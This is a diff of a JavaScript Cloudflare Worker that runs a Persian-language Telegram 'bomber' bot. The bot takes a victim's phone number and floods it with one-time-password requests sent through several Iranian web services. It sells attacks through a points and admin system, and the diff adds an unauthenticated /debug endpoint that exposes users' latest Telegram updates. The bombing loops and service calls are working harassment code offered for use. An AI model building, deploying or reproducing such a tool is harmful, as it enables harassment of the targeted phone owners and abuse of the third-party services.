@@ -1,5 +1,9 @@
-// ==================== تنظیمات ====================
-const ADMIN_ID = 6887901539; // آیدی عددی ادمین
+const ADMIN_ID = 6887901539;
+
+// حافظه موقت برای دیباگ
+let lastUpdate = null;
+let lastUpdateTime = null;
+let updateCount = 0;
 
 // ==================== سرویس‌های بمبر ====================
 const SERVICES = {
@@ -20,13 +24,11 @@ const SERVICES = {
   filmnet: (p) => fetch(`https://api-v2.filmnet.ir/access-token/users/${p.replace('+98', '0')}/otp`, { method: 'GET' })
 };
 
-// ==================== حافظه موقت ====================
 const userStates = new Map();
 const userPoints = new Map();
 const userDailyReward = new Map();
 const userFreeBomb = new Map();
 
-// ==================== توابع کمکی ====================
 function normalizePhone(phone) {
   let cleaned = phone.replace(/[^\d+]/g, '');
   if (cleaned.startsWith("09")) return "+98" + cleaned.substring(1);
@@ -67,7 +69,6 @@ async function editMessage(token, chatId, messageId, text, replyMarkup = null) {
   }
 }
 
-// ==================== کیپدها (Inline Keyboard تلگرام) ====================
 function mainKeypad() {
   return {
     inline_keyboard: [
@@ -106,59 +107,31 @@ function adminKeypad() {
   };
 }
 
-// ==================== عملیات بمباران ====================
-async function runBombing(token, chatId, messageId, phone, rounds) {
-  const serviceKeys = Object.keys(SERVICES);
-  let successCount = 0;
-  let failCount = 0;
-  
-  for (let round = 1; round <= rounds; round++) {
-    for (let i = 0; i < serviceKeys.length; i++) {
-      const serviceName = serviceKeys[i];
-      try {
-        const response = await SERVICES[serviceName](phone);
-        if (response && (response.ok || response.status === 200 || response.status === 201)) {
-          successCount++;
-        } else {
-          failCount++;
-        }
-      } catch (e) {
-        failCount++;
-      }
-      
-      // آپدیت هر 5 درخواست
-      if ((successCount + failCount) % 5 === 0) {
-        await editMessage(token, chatId, messageId,
-          `🎯 در حال بمباران...\n\n` +
-          `📱 هدف: \`${phone}\`\n` +
-          `🔄 دور: ${round}/${rounds}\n` +
-          `✅ موفق: ${successCount}\n` +
-          `❌ ناموفق: ${failCount}`
-        );
-      }
-      
-      await new Promise(r => setTimeout(r, 50));
-    }
-  }
-  
-  await editMessage(token, chatId, messageId,
-    `✅ عملیات تمام شد!\n\n` +
-    `📱 هدف: \`${phone}\`\n` +
-    `🔄 دورها: ${rounds}\n` +
-    `✅ موفق: ${successCount}\n` +
-    `❌ ناموفق: ${failCount}\n\n` +
-    `💫 برای عملیات جدید از منو استفاده کنید`
-  );
-  
-  await sendMessage(token, chatId, "👇 منوی اصلی:", mainKeypad());
-}
-
-// ==================== هندلر اصلی ====================
 export default {
   async fetch(request, env) {
 
     if (request.method === "GET") {
-      return new Response("🤖 Telegram Bomber Webhook Active ✅");
+      const url = new URL(request.url);
+      
+      // 🔍 endpoint دیباگ
+      if (url.pathname === "/debug") {
+        return new Response(JSON.stringify({
+          lastUpdate: lastUpdate,
+          lastUpdateTime: lastUpdateTime,
+          updateCount: updateCount,
+          message: "آخرین آپدیت دریافتی از تلگرام"
+        }, null, 2), {
+          headers: { "Content-Type": "application/json" }
+        });
+      }
+      
+      if (url.pathname === "/clear") {
+        lastUpdate = null;
+        lastUpdateTime = null;
+        return new Response("✅ پاک شد");
+      }
+      
+      return new Response("🤖 Telegram Bomber Webhook Active ✅\n\n/debug - دیدن آخرین آپدیت\n/clear - پاک کردن");
     }
 
     if (request.method !== "POST") {
@@ -168,11 +141,15 @@ export default {
     try {
       const update = await request.json();
       
+      // ذخیره برای دیباگ
+      lastUpdate = update;
+      lastUpdateTime = new Date().toISOString();
+      updateCount++;
+      
       console.log("===== TELEGRAM UPDATE =====");
       console.log(JSON.stringify(update));
       console.log("=========================");
 
-      // استخراج اطلاعات از ساختار تلگرام
       let chatId = null;
       let text = "";
       let userId = null;
@@ -180,7 +157,6 @@ export default {
       let messageId = null;
       let isCallback = false;
       
-      // پیام متنی
       if (update.message) {
         chatId = update.message.chat.id;
         text = update.message.text || "";
@@ -188,7 +164,6 @@ export default {
         messageId = update.message.message_id;
       }
       
-      // کلیک روی دکمه (Callback Query)
       if (update.callback_query) {
         isCallback = true;
         chatId = update.callback_query.message.chat.id;
@@ -196,7 +171,6 @@ export default {
         userId = update.callback_query.from.id;
         messageId = update.callback_query.message.message_id;
         
-        // باید به تلگرام بگیم که دکمه زده شده (Answer Callback Query)
         await fetch(`https://api.telegram.org/bot${env.TOKEN}/answerCallbackQuery`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -215,11 +189,9 @@ export default {
       }
 
       const state = userStates.get(chatId) || {};
-      const points = userPoints.get(chatId) || 3; // شروع با 3 امتیاز
+      const points = userPoints.get(chatId) || 3;
       const isAdmin = userId === ADMIN_ID;
 
-      // ==================== دکمه‌ها ====================
-      
       if (buttonId === "cancel") {
         userStates.delete(chatId);
         await sendMessage(env.TOKEN, chatId, "💣 به منوی اصلی برگشتید!", mainKeypad());
@@ -230,8 +202,7 @@ export default {
         if (points <= 0) {
           await sendMessage(env.TOKEN, chatId, 
             "⚠️ امتیاز کافی ندارید!\n\n" +
-            "⭐ امتیاز فعلی: " + points + "\n\n" +
-            "🎁 پاداش روزانه بگیرید یا از ادمین امتیاز بخواهید",
+            "⭐ امتیاز فعلی: " + points,
             mainKeypad());
           return new Response("OK");
         }
@@ -249,15 +220,14 @@ export default {
           const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastFree)) / (60 * 60 * 1000));
           await sendMessage(env.TOKEN, chatId, 
             "⏳ هنوز 24 ساعت نگذشته!\n\n" +
-            "⏰ " + remaining + " ساعت دیگر می‌توانید دوباره استفاده کنید",
+            "⏰ " + remaining + " ساعت دیگر",
             mainKeypad());
           return new Response("OK");
         }
         userStates.set(chatId, { state: "awaiting_free_bomb" });
         await sendMessage(env.TOKEN, chatId, 
           "🎁 بمبر رایگان فعال شد!\n\n" +
-          "📞 شماره هدف را وارد کنید:\n" +
-          "(1 دور با 5 سرویس تصادفی)",
+          "📞 شماره هدف را وارد کنید:",
           backKeypad());
         return new Response("OK");
       }
@@ -323,7 +293,6 @@ export default {
         return new Response("OK");
       }
       
-      // دکمه‌های دور
       if (buttonId && buttonId.startsWith("rounds_")) {
         const rounds = parseInt(buttonId.split('_')[1]);
         const phone = state.phone;
@@ -333,7 +302,6 @@ export default {
           return new Response("OK");
         }
         
-        // کسر امتیاز
         const currentPoints = userPoints.get(chatId) || 0;
         if (currentPoints <= 0) {
           await sendMessage(env.TOKEN, chatId, "⚠️ امتیاز کافی ندارید!", mainKeypad());
@@ -341,11 +309,9 @@ export default {
         }
         userPoints.set(chatId, currentPoints - 1);
         
-        // آپدیت آمار
         state.attacks = (state.attacks || 0) + 1;
         userStates.set(chatId, state);
         
-        // ارسال پیام اولیه
         const result = await sendMessage(env.TOKEN, chatId, 
           "⏳ در حال آماده‌سازی...\n\n" +
           "📱 هدف: `" + phone + "`\n" +
@@ -354,11 +320,6 @@ export default {
         
         const msgId = result?.result?.message_id || messageId;
         
-        // شروع بمباران در پس‌زمینه
-        // چون Worker محدودیت زمانی دارد، فقط 1 دور اجرا می‌کنیم
-        // برای دورهای بیشتر باید از Queue استفاده کرد
-        
-        // اجرای واقعی بمباران (محدود به 1 دور برای جلوگیری از تایم‌اوت)
         const serviceKeys = Object.keys(SERVICES);
         let successCount = 0;
         let failCount = 0;
@@ -380,18 +341,15 @@ export default {
           await editMessage(env.TOKEN, chatId, msgId,
             `✅ عملیات تمام شد!\n\n` +
             `📱 هدف: \`${phone}\`\n` +
-            `🔄 دورها: 1 (محدودیت ورکر)\n` +
+            `🔄 دورها: 1\n` +
             `✅ موفق: ${successCount}\n` +
-            `❌ ناموفق: ${failCount}\n\n` +
-            `💫 برای عملیات جدید از منو استفاده کنید`
+            `❌ ناموفق: ${failCount}`
           );
         }
         
         await sendMessage(env.TOKEN, chatId, "👇 منوی اصلی:", mainKeypad());
         return new Response("OK");
       }
-      
-      // ==================== پنل ادمین ====================
       
       if (text === "/admin" && isAdmin) {
         userStates.set(chatId, { state: "admin" });
@@ -432,8 +390,6 @@ export default {
         return new Response("OK");
       }
       
-      // ==================== /start ====================
-      
       if (text.trim() === "/start") {
         userStates.delete(chatId);
         await sendMessage(env.TOKEN, chatId,
@@ -445,9 +401,6 @@ export default {
         return new Response("OK");
       }
       
-      // ==================== ورودی‌های متنی ====================
-      
-      // دریافت شماره برای بمباران
       if (state.state === "awaiting_phone") {
         const phone = normalizePhone(text);
         if (!phone) {
@@ -465,7 +418,6 @@ export default {
         return new Response("OK");
       }
       
-      // دریافت شماره برای بمبر رایگان
       if (state.state === "awaiting_free_bomb") {
         const phone = normalizePhone(text);
         if (!phone) {
@@ -483,7 +435,6 @@ export default {
         
         const msgId = result?.result?.message_id;
         
-        // اجرای بمباران رایگان
         const serviceKeys = Object.keys(SERVICES);
         const selectedServices = serviceKeys.sort(() => 0.5 - Math.random()).slice(0, 5);
         
@@ -516,7 +467,6 @@ export default {
         return new Response("OK");
       }
       
-      // افزودن امتیاز (ادمین)
       if (state.state === "add_points" && isAdmin) {
         const parts = text.split('|');
         if (parts.length === 2) {
@@ -537,7 +487,6 @@ export default {
         return new Response("OK");
       }
       
-      // پیام پیش‌فرض
       await sendMessage(env.TOKEN, chatId, 
         "❓ دستور نامفهوم\n\n" +
         "از منوی زیر استفاده کنید:",
